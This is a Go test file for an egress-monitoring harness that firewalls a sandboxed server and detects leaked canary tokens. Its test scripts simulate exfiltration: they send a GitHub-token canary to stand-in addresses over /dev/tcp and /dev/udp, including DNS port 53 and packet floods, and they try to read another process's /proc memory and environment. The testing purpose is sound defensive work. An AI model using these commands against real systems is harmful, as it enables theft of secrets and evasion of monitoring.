package egress

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"syscall"
	"testing"

	"github.com/JairJosafath/mcp-customs/src/internal/canary"
	"github.com/JairJosafath/mcp-customs/src/internal/findings"
)

// nobody is the unprivileged account the root-only tests run clients as.
const nobody = 65534

// requireFirewall skips a test that puts up the real firewall unless it
// runs as root with iptables and CAP_NET_ADMIN, as the harness does in
// the MicroVM.
func requireFirewall(t *testing.T) {
	t.Helper()
	if os.Geteuid() != 0 {
		t.Skip("needs root to put up the firewall with iptables: run `go test` as root to run it")
	}
	if err := Exec(t.Context(), Command{"iptables", "-w", "-t", "nat", "-L", "OUTPUT", "-n"}); err != nil {
		t.Skipf("needs iptables and CAP_NET_ADMIN: %v", err)
	}
}

// asNobody runs a shell script as the unprivileged account, as the
// harness runs the server under test, and answers its output.
func asNobody(t *testing.T, script string) (string, error) {
	t.Helper()
	id := strconv.Itoa(nobody)
	args := []string{"--reuid=" + id, "--regid=" + id, "--clear-groups", "--no-new-privs", "--", "/bin/bash", "-c", script}
	cmd := exec.CommandContext(t.Context(), "/usr/bin/setpriv", args...) //nolint:gosec // the tests' own scripts, run as an unprivileged user
	cmd.Env = []string{"PATH=/usr/bin:/bin", "HOME=/"}
	cmd.Dir = "/"
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// upFirewall serves e and holds nobody's traffic to it, refused packets
// logged to e, until the test ends.
func upFirewall(t *testing.T, e *Egress) {
	t.Helper()
	l, err := Listen(t.Context())
	if err != nil {
		t.Fatal(err)
	}
	if err := l.HoldBursts(); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(e.Serve(l, RedirectedFrom))
	group := uint16(2000 + os.Getpid()%1000)
	nflog, err := OpenNFLog(group)
	if err != nil {
		t.Fatal(err)
	}
	logged := make(chan error, 1)
	go func() { logged <- e.ServeNFLog(nflog) }()
	t.Cleanup(func() {
		_ = nflog.Close()
		if err := <-logged; err != nil {
			t.Error(err)
		}
	})
	proxy, dns, catch := l.Ports()
	fw := Firewall{Chain: fmt.Sprintf("MCPC_TEST_%d", os.Getpid()), UID: nobody, ProxyPort: proxy, DNSPort: dns, CatchPort: catch, NFLogGroup: group}
	if err := fw.Up(t.Context(), Exec); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { fw.Down(context.Background(), Exec) })
}

func TestADirectConnectionToAnOutsideAddressIsRefusedAndRecorded(t *testing.T) {
	requireFirewall(t)
	rec := newRecorded()
	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
	e.Observe(rec.observe)
	upFirewall(t, e)

	// 203.0.113.7 (TEST-NET-3) on 443, ignoring HTTPS_PROXY: as a pinned
	// client or raw socket would. Whatever the far end says is printed.
	out, err := asNobody(t, `exec 3<>/dev/tcp/203.0.113.7/443 || exit 7
printf 'GET / HTTP/1.0\r\nHost: 203.0.113.7\r\n\r\n' >&3
cat <&3`)
	if err == nil || strings.Contains(out, "HTTP/") {
		t.Errorf("the direct connection = %q, %v; want it refused, nothing answered", out, err)
	}
	// The catcher records a connection before it resets it, so it is
	// recorded by the time the client has seen the reset.
	want := ConnectDetail{Address: "203.0.113.7", Port: 443, Proto: "tcp", Via: "direct", Refused: true, Unscanned: "it was still open after 1s; what it sent after was not searched"}
	if got := rec.of(KindConnect); len(got) != 1 || !jsonEqual(t, got[0], want) {
		t.Errorf("connect = %+v, want %+v", got, want)
	}
}

func TestDirectUDPIsRefusedAndRecordedWithTheCanariesInIt(t *testing.T) {
	requireFirewall(t)
	rec := newRecorded()
	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	upFirewall(t, e)

	out, err := asNobody(t, "printf 'k=%s' '"+testCanaries.Get(canary.GitHubToken)+"' > /dev/udp/203.0.113.9/9999")
	if err == nil {
		t.Errorf("direct UDP = %q, want it refused", out)
	}
	// NFLOG delivers the packet to the harness after the sender is refused.
	rec.waitFor(t, func() bool { return len(rec.of(KindConnect)) > 0 })
	want := ConnectDetail{
		Address: "203.0.113.9", Port: 9999, Proto: "udp", Via: "direct", Refused: true,
		Canaries: []findings.Match{{Canary: canary.GitHubToken, Encoding: findings.Plain}},
	}
	if got := rec.of(KindConnect); !jsonEqual(t, got[0], want) {
		t.Errorf("connect = %+v, want %+v", got, want)
	}
}

func TestAnythingSentToPort53AtAnyAddressIsSearched(t *testing.T) {
	requireFirewall(t)
	rec := newRecorded()
	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	upFirewall(t, e)

	_, _ = asNobody(t, "printf 'k=%s' '"+testCanaries.Get(canary.GitHubToken)+"' > /dev/udp/203.0.113.9/53")
	rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleCanaryLeft) })
}

func TestADirectTCPConnectionsPayloadIsSearched(t *testing.T) {
	requireFirewall(t)
	rec := newRecorded()
	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	upFirewall(t, e)

	_, _ = asNobody(t, "printf 'k=%s' '"+testCanaries.Get(canary.GitHubToken)+"' > /dev/tcp/203.0.113.9/9997")
	rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleCanaryLeft) })
}

func TestDirectIPv6IsRefusedAndRecorded(t *testing.T) {
	requireFirewall(t)
	if fd, err := syscall.Socket(syscall.AF_INET6, syscall.SOCK_DGRAM, 0); err != nil {
		t.Skipf("this kernel has no IPv6 (%v), so there is no IPv6 egress to refuse; the ip6tables chain still rejects and logs it all", err)
	} else {
		_ = syscall.Close(fd)
	}
	if err := Exec(t.Context(), Command{"ip6tables", "-w", "-t", "filter", "-L", "OUTPUT", "-n"}); err != nil {
		t.Skipf("needs ip6tables: %v", err)
	}
	rec := newRecorded()
	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
	e.Observe(rec.observe)
	upFirewall(t, e)

	if out, err := asNobody(t, `exec 3<>/dev/tcp/2001:db8::7/443`); err == nil {
		t.Errorf("direct IPv6 TCP = %q, want it refused", out)
	}
	rec.waitFor(t, func() bool { return len(rec.of(KindConnect)) > 0 })
	want := ConnectDetail{Address: "2001:db8::7", Port: 443, Proto: "tcp", Via: "direct", Refused: true}
	if got := rec.of(KindConnect); !jsonEqual(t, got[0], want) {
		t.Errorf("connect = %+v, want %+v", got, want)
	}
}

func TestTheCAKeyIsOutOfTheServersReach(t *testing.T) {
	if os.Geteuid() != 0 {
		t.Skip("needs root, as the harness runs, to show another user can't reach the CA: run `go test` as root to run it")
	}
	base := sharedTempDir(t)
	dir := filepath.Join(base, "mcp-customs")
	trust, err := WriteTrust(dir, newCA(t), nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, path := range []string{dir, trust.CAFile, trust.BundleFile} {
		info, err := os.Stat(path)
		if err != nil {
			t.Fatal(err)
		}
		st, _ := info.Sys().(*syscall.Stat_t)
		if st == nil || st.Uid != 0 || info.Mode().Perm()&0o022 != 0 {
			t.Errorf("%s is %v, owned by %v; want root's, writable by root alone", path, info.Mode(), st)
		}
	}
	// The certificate is the server's to read; the key is nowhere it can
	// read: not on disk, and not in the harness's memory or environment,
	// which only root may read of a root process.
	pid := strconv.Itoa(os.Getpid())
	if out, err := asNobody(t, "cat "+trust.CAFile); err != nil || !strings.Contains(out, "BEGIN CERTIFICATE") {
		t.Errorf("the server can't read the CA's certificate: %q, %v", out, err)
	}
	if out, err := asNobody(t, "grep -rl 'PRIVATE KEY' "+dir); err == nil {
		t.Errorf("a private key is in the trust directory: %q", out)
	}
	for _, f := range []string{"mem", "maps", "environ"} {
		if out, err := asNobody(t, "head -c 64 /proc/"+pid+"/"+f+" | od -c | head -1"+"; exit ${PIPESTATUS[0]}"); err == nil {
			t.Errorf("the server can read the harness's /proc/%s/%s: %q", pid, f, out)
		}
	}
	if out, err := asNobody(t, "echo forged > "+trust.CAFile+" || touch "+filepath.Join(dir, "planted")); err == nil {
		t.Errorf("the server can change what it trusts: %q", out)
	}
}

// sharedTempDir is a directory of the test's that the unprivileged account
// may read, as /etc is: t.TempDir and its parent are private to root.
func sharedTempDir(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	for _, d := range []string{filepath.Dir(dir), dir} {
		if err := os.Chmod(d, 0o755); err != nil { //nolint:gosec // the account must read what the test puts here
			t.Fatal(err)
		}
	}
	return dir
}

// leftAs are the canary findings code makes of what rec observed.
func leftAs(t *testing.T, rec *recorded) []findings.Finding {
	t.Helper()
	rec.mu.Lock()
	defer rec.mu.Unlock()
	obs := make([]findings.Observation, 0, len(rec.obs))
	for _, o := range rec.obs {
		raw, err := json.Marshal(o.detail)
		if err != nil {
			t.Fatal(err)
		}
		obs = append(obs, findings.Observation{Kind: o.kind, Detail: raw})
	}
	return findings.FromObservations(obs, testCanaries)
}

func hasRule(found []findings.Finding, rule string) bool {
	return slices.ContainsFunc(found, func(f findings.Finding) bool { return f.Rule == rule })
}

func TestACanarySentAfterAFloodOfDirectTrafficIsStillFound(t *testing.T) {
	requireFirewall(t)
	rec := newRecorded()
	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	upFirewall(t, e)

	// More junk than a run records in full, then the token.
	_, _ = asNobody(t, fmt.Sprintf(`for i in $(seq %d); do printf junk > /dev/udp/203.0.113.9/9999 2>/dev/null; done
printf 'k=%%s' '%s' > /dev/udp/203.0.113.9/9998`, maxDirect+1, testCanaries.Get(canary.GitHubToken)))
	rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleCanaryLeft) })
	if found := leftAs(t, rec); !hasRule(found, findings.RuleDirectUnrecorded) {
		t.Errorf("findings = %+v, want the flood itself found too", found)
	}
}

func TestABurstOfLargePacketsLosesNoCanaryUnsaid(t *testing.T) {
	requireFirewall(t)
	python, err := exec.LookPath("python3")
	if err != nil {
		t.Skip("needs python3 to send a burst of large datagrams")
	}
	rec := newRecorded()
	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	upFirewall(t, e)

	// 600 datagrams of 60 KB as fast as Python sends them, the token in the
	// 300th: the NFLOG buffer holds them all, so the token is found.
	_, _ = asNobody(t, python+` -I -c '
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
pad = b"x" * 60000
for i in range(600):
    body = (b"k=`+testCanaries.Get(canary.GitHubToken)+`;" + pad) if i == 299 else pad
    try:
        s.sendto(body, ("203.0.113.9", 9999))
    except OSError:
        pass
'`)
	rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleCanaryLeft) })
	if found := leftAs(t, rec); hasRule(found, findings.RuleDirectUnrecorded) {
		t.Errorf("findings = %+v, want no packet lost", found)
	}
}

func TestTheRefusedPacketLogHoldsABurst(t *testing.T) {
	requireFirewall(t)
	n, err := OpenNFLog(uint16(3000 + os.Getpid()%1000))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = n.Close() })
	got, err := syscall.GetsockoptInt(n.fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF)
	if err != nil {
		t.Fatal(err)
	}
	if got < nflogReceiveBuffer {
		t.Errorf("the netlink socket's buffer is %d bytes, want at least %d", got, nflogReceiveBuffer)
	}
}

func TestABurstToPort53LosesNoCanary(t *testing.T) {
	requireFirewall(t)
	python, err := exec.LookPath("python3")
	if err != nil {
		t.Skip("needs python3 to send a burst of large datagrams")
	}
	rec := newRecorded()
	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	upFirewall(t, e)

	// As the NFLOG burst, aimed at the DNS socket: the token in the 300th.
	_, _ = asNobody(t, python+` -I -c '
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
pad = b"x" * 60000
for i in range(600):
    body = (b"k=`+testCanaries.Get(canary.GitHubToken)+`;" + pad) if i == 299 else pad
    try:
        s.sendto(body, ("203.0.113.9", 53))
    except OSError:
        pass
'`)
	rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleCanaryLeft) })
	if found := leftAs(t, rec); hasRule(found, findings.RuleDirectUnrecorded) {
		t.Errorf("findings = %+v, want no datagram lost", found)
	}
}
